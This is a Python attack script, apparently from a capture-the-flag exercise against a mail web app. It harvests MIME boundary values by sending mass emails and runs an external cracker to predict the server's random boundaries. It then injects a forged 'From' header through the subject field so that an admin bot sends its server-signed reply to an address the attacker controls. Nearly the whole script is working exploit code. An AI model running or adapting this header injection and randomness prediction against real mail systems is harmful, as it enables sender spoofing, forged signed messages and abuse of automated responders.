"""Diagnostic run: make the bot reply to user@ses (From injection -> user@ses) so the
REAL server-generated signed reply lands in our inbox where we can inspect it.

Everything (warmup, crack, probe, diag mail, one bot run) in one go.
"""
import sys, os, json, re, time, subprocess, http.client
from urllib.parse import urlparse
sys.path.insert(0, r'.')
from _z_496_spec import make_D, ews, PWN

BASE = sys.argv[1].rstrip('/')
TARGET = sys.argv[2] if len(sys.argv) > 2 else 'user@ses'
WARM = int(sys.argv[3]) if len(sys.argv) > 3 else 700
EML = r'./_z_496_emls'
u = urlparse(BASE)
HOST, PORT = u.hostname, u.port or 80
conn = http.client.HTTPConnection(HOST, PORT, timeout=60)


def req(method, path, obj=None, token=None):
    global conn
    last = None
    for attempt in range(4):
        try:
            body = json.dumps(obj) if obj is not None else None
            hdrs = {}
            if body is not None:
                hdrs['Content-Type'] = 'application/json'
            if token:
                hdrs['token'] = token
            conn.request(method, path, body=body, headers=hdrs)
            r = conn.getresponse()
            d = r.read().decode()
            if r.status >= 400:
                raise RuntimeError('%s %s -> %s %s' % (method, path, r.status, d[:200]))
            return json.loads(d)
        except (http.client.HTTPException, ConnectionError, OSError) as e:
            last = e
            try: conn.close()
            except Exception: pass
            conn = http.client.HTTPConnection(HOST, PORT, timeout=60)
            time.sleep(0.2)
    raise last


try:
    cfg = json.load(open(r'./_z_496_remote.json'))
except Exception:
    cfg = {}
if cfg.get('base') == BASE and cfg.get('tok'):
    pw, tok = cfg['pw'], cfg['tok']
    print('[i] reuse token')
else:
    pw = req('GET', '/api/password')
    tok = req('POST', '/api/login', {'username': 'user@ses', 'password': pw})
    json.dump({'base': BASE, 'pw': pw, 'tok': tok}, open(r'./_z_496_remote.json', 'w'))
print('[i] pw', pw, 'me', req('GET', '/api/me', None, tok), flush=True)

# ---- warmup ----
ids = []
t0 = time.time()
for i in range(WARM):
    ids.append(req('POST', '/api/send', {'to': 'user@ses', 'subject': 'q%d' % i, 'body': 'b'}, tok))
print('[i] warmup %d in %.1fs' % (len(ids), time.time() - t0), flush=True)
emails = req('GET', '/api/emails', None, tok)
rows = []
for eid in ids:
    e = emails.get(eid)
    if e:
        m = re.search(r'boundary="=+(\d+)=+"', e['data'])
        if m:
            rows.append((e['time'], int(m.group(1))))
rows.sort()
print('[i] rows %d dup %d' % (len(rows), len(rows) - len(set(t for t, _ in rows))))
json.dump([b for _, b in rows], open(r'./_z_496_bounds.json', 'w'))

# ---- crack ----
t0 = time.time()
r = subprocess.run(['wsl', '-d', 'kali-linux', '--', 'python3', './_z_496_crack2.py'],
                   capture_output=True, text=True)
print('[i] crack rc=%d %.1fs' % (r.returncode, time.time() - t0), r.stdout[-300:])
if r.returncode != 0:
    print(r.stderr[-800:]); sys.exit(1)
preds = json.load(open(r'./_z_496_pred.json'))

# ---- probe ----
pid = req('POST', '/api/send', {'to': 'user@ses', 'subject': 'probe', 'body': 'b'}, tok)
em = req('GET', '/api/email/' + pid, None, tok)
got = int(re.search(r'boundary="=+(\d+)=+"', em['data']).group(1))
print('[i] probe %d vs preds[0] %d -> %s' % (got, preds[0], 'OK' if got == preds[0] else 'MISMATCH'))
if got != preds[0]:
    sys.exit('misaligned')

# ---- diagnostic mail: bot will reply to TARGET ----
B1 = '=' * 15 + ('%019d' % preds[2]) + '=='
print('[i] expected reply inner boundary = preds[2] =', B1)
subj = ews(make_D(B1)) + "\nFrom :" + TARGET
d = req('POST', '/api/send', {'to': 'admin@ses', 'subject': subj, 'body': 'hello'}, tok)
print('[i] diag mail', d)

before = set(req('GET', '/api/emails', None, tok).keys())
t0 = time.time()
print('[i] bot run ->', req('POST', '/api/admin_bot', None, tok), '%.1fs' % (time.time() - t0), flush=True)
time.sleep(1)

for attempt in range(10):
    emails = req('GET', '/api/emails', None, tok)
    new = [k for k in emails if k not in before]
    if new:
        for k in new:
            data = emails[k]['data']
            m = re.search(r'boundary="=+(\d+)=+"', data)
            b = int(m.group(1)) if m else None
            print('[i] NEW email %s boundary=%s expected outer=' % (k, b), preds[3],
                  'OR', preds[5])
            p = os.path.join(EML, 'real_reply.eml')
            open(p, 'w', newline='', encoding='utf-8').write(data)
            print('[i] saved', p, len(data), 'bytes')
            print('---- first 700 chars ----')
            print(data[:700])
        break
    print('[i] waiting for reply', attempt, flush=True)
    time.sleep(3)
else:
    print('[-] no reply arrived in our inbox')
